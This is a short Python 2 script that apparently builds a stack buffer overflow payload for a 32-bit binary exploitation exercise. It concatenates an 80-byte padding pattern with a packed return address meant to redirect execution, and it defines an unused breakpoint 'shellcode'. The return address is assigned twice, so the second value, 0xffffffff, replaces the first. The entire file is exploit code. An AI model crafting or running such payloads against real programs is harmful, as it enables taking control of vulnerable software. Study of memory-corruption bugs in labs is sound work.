import struct

value = struct.pack("I", 0x080484d3)
value = struct.pack("I", 0xffffffff)

shellcode = "\xCC" * 4

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

payload = padding + value

print payload
